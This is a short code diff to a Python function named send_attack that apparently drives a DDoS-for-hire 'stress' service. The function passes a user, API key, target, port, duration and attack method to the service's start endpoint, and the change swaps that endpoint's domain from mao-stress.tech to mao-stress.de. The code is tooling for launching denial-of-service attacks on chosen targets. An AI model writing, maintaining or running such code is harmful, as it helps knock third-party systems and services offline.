@@ -1,7 +1,7 @@
 import requests
 
 def send_attack(user, api_key, target, port, duration, method):
-    url = "https://mao-stress.tech/api/start.php"
+    url = "https://mao-stress.de/api/start.php"
     params = {
         'user': user,
         'api_key': api_key,
